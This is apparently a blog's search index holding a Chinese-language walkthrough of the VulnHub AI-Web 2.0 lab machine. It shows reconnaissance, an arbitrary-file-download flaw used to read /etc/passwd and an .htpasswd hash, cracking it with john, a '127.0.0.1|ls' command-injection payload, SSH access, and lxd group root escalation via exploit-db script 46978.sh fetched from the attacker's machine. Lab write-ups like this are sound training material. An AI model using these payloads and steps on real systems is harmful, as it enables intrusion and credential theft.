<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>VulnHub靶机AI-Web2.0复现</title>
      <link href="/post/8d8aa195.html"/>
      <url>/post/8d8aa195.html</url>
      
        <content type="html"><![CDATA[<h1 id="VulnHub靶机AI-Web2-0复现"><a href="#VulnHub靶机AI-Web2-0复现" class="headerlink" title="VulnHub靶机AI-Web2.0复现"></a>VulnHub靶机AI-Web2.0复现</h1><p><a href="https://download.vulnhub.com/aiweb/AI-Web-2.0.7z">https://download.vulnhub.com/aiweb/AI-Web-2.0.7z</a></p><p>打开靶机即可换kali</p><p><img src="/img/ai1.png"></p><p><img src="/img/ai2.png"></p><p>对内网络段进行信息搜集</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ifconfig</span>arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/img/ai3.png"></p><p>只能是这个192.168.71.161的ip了，对他进行一个完整的扫描</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-T4</span> <span class="token parameter variable">-A</span> -p- <span class="token number">192.168</span>.71.161<span class="token parameter variable">-sS</span> SYN半开放扫描--<span class="token operator">></span>不完整的TCP连接<span class="token parameter variable">-sV</span> 版本探测<span class="token parameter variable">-T4</span> 扫描速度 从低到高T0到T5<span class="token parameter variable">-A</span> 综合扫描包含了<span class="token punctuation">[</span>-O 操作系统探测,<span class="token parameter variable">-sV</span> 版本探测,<span class="token parameter variable">--script</span><span class="token operator">=</span>default 脚本扫描,<span class="token parameter variable">--traceroute</span> 路由跟踪,<span class="token punctuation">]</span>-p-  <span class="token number">1</span>-65535端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/img/ai4.png"></p><p>疑似有个XuezhuLi的用户，发现有开放80端口和22端口，先给22端口来个最经典的ssh 3次连接</p><p><img src="/img/ai5.png"></p><p>发现不能空密码进行，这里就不去爆破了，一般是ssh端口要么是强密码或者是密钥才能进入，我们去到80网页端口看看</p><p><img src="/img/ai6.png"></p><p>这里我试了sql注入和xss以及弱口令都没货，我们就可以考虑直接换思路，扫下目录了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> http://192.168.71.161 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/img/ai7.png"></p><p>这里我看webadmin一堆站点我们就顺藤摸瓜先看看</p><p><img src="/img/ai8.png"></p><p>试试robots.txt</p><p><img src="/img/ai9.png"></p><p>分别进入站点看一下吧</p><p><img src="/img/ai10.png"></p><p><img src="/img/ai11.png"></p><p>这里得到有重要的信息在这个&#x2F;webadmin&#x2F;S0mextras&#x2F;的目录下，并且有个登录框站点，这个登录框同样是无法通过正常漏洞进去后台的</p><p>再通过前面的信息搜集我们利用这个File去sploit看看是否有Nday漏洞</p><p><img src="/img/ai12.png"></p><p>这里的XuezhuLi我们之前就信息搜集到了,我们去历史漏洞网看看有没有相关信息</p><p><img src="/img/ai13.png"></p><p>确实存在两个历史漏洞我们进去看看exp是什么</p><p><img src="/img/ai14.png"></p><p><img src="/img/ai15.png"></p><p>第一个为csrf的漏洞，第二个是任意文件下载的漏洞，我们之前目录扫描的download.php是否能利用到任意文件下载的漏洞呢？</p><p><img src="/img/ai16.png"></p><p>确实可以利用，我们看看里面有什么用户</p><p><img src="/img/ai17.png"></p><p>发现有两个普通用户在这，aiweb2和n0nr00tuser</p><p>后续继续用任意文件下载读取到关键信息&#x2F;etc&#x2F;apache2&#x2F;.htpasswd</p><p><img src="/img/ai18.png"></p><p>得到aiweb2admin加密过的密码</p><p>我们试试john利用kali自带的字典是否可以解密出来</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> aiweb2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/img/ai19.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">john <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt /root/aiweb2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/img/ai20.png"></p><p>爆出密码 aiweb2admin&#x2F;c.ronaldo，试试能不能在之前的站点直接登录</p><p><img src="/img/ai21.png"></p><p>成功进入，一眼为禁用js然后拼接命令RCE</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">127.0</span>.0.1<span class="token operator">|</span><span class="token builtin class-name">pwd</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/img/ai22.png"></p><p>直接去之前那个有重要信息的目录下找</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">127.0</span>.0.1<span class="token operator">|</span><span class="token function">ls</span> /var/www/html/webadmin/S0mextras<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/img/ai23.png"></p><p>只有一个文件，不应该，我们使用ls -la看所有隐藏的</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">127.0</span>.0.1<span class="token operator">|</span><span class="token function">ls</span> <span class="token parameter variable">-al</span> /var/www/html/webadmin/S0mextras<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/img/ai24.png"></p><p>应该是个普通文件，我们使用这条命令去找会更加清楚里面到底有什么</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">127.0</span>.0.1<span class="token operator">|</span><span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-type</span> f /var/www/html/webadmin/S0mextras<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/img/ai25.png"></p><p>访问这个txt看看</p><p><img src="/img/ai26.png"></p><p>这就有了能ssh连接的用户和密码了，我们直接连</p><p><img src="/img/ai26.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> n0nr00tuser@192.168.71.161<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/img/ai27.png"></p><p>成功拿到普通用户权限，下一步做下信息搜集想办法继续提权</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">id</span><span class="token function">uname</span> <span class="token parameter variable">-a</span><span class="token function">crontab</span> <span class="token parameter variable">-l</span><span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null 或者 <span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一套下来发现没有特别的好的方法，我们利用自动化信息收集试试</p><p>用我们的kali下一个master再下载到靶机中</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://codeload.github.com/rebootuser/LinEnum/zip/refs/heads/master <span class="token function">unzip</span> master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/img/ai28.png"></p><p>kali本机开启http服务，也可在靶机上使用scp下载服务</p><p>两种方法都可以，我这里使用scp下载服务</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">scp</span> root@192.168.71.133:/root/LinEnum-master/LinEnum.sh ./     <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/img/ai29.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./LinEnum.sh <span class="token parameter variable">-r</span> report.txt  直接搜集<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/img/ai30.png"></p><p>提示我们lxd组提权</p><p><img src="/img/ai31.png"></p><p>将shell脚本下载下来</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit <span class="token parameter variable">-m</span> linux/local/46978.sh<span class="token function">vim</span> <span class="token number">46978</span>.sh:set <span class="token assign-left variable">ff</span><span class="token operator">=</span>unix  修改成unix的换行符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/img/ai32.png"></p><p>这个脚本需要配合alpine-v3.20-x86_64-20240802_0530.tar.gz文件才能使用，而这个文件又需要从build-alpine中下载</p><p><img src="/img/ai33.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine    <span class="token function">chmod</span> a+x build-alpine  ./build-alpine   kali需要用vpn才行,下载失败就多下几次<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/img/ai34.png"></p><p>换一种方法从kali下载</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-m</span> http.server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/img/ai35.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://192.168.71.133:8000/46978.sh<span class="token function">wget</span> http://192.168.71.133:8000/alpine-v3.20-x86_64-20240802_0530.tar.gz<span class="token function">chmod</span> a+x <span class="token number">46978</span>.sh ./46978.sh <span class="token parameter variable">-f</span> alpine-v3.20-x86_64-20240802_0530.tar.gz <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/img/ai36.png"></p><p>成功拿下root权限，后续给自己反弹shell也行，这里我们还要去找一下flag</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-name</span> flag*<span class="token function">cat</span> /mnt/root/root/flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/img/ai37.png"></p><p><img src="/img/ai38.png"></p><p>结束</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>测试</title>
      <link href="/post/9daba997.html"/>
      <url>/post/9daba997.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
